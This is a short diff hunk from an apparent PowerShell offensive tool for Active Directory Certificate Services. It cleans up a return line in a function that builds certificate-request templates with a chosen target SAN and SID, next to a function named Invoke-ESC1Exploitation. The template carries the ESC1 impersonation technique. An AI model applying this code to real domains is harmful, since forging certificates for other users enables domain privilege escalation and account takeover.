@@ -389,7 +389,7 @@ CertificateTemplate = {0}
 
     $sidLine = if ([string]::IsNullOrWhiteSpace($TargetSid)) { '' } else { '_continue_ = "URL=tag:microsoft.com,2022-09-14:sid:{2}"' }
 
-    return ($infTemplate -f $TemplateName, $TargetSan, $TargetSid, $sidLine)$targetSidValue = Resolve-TargetUserSid -Identity $targetSanValue -LdapServer $Config.LdapServer -LdapCredential $Config.LdapCredential
+    return ($infTemplate -f $TemplateName, $TargetSan, $TargetSid, $sidLine)
 }
 
 function Invoke-ESC1Exploitation {
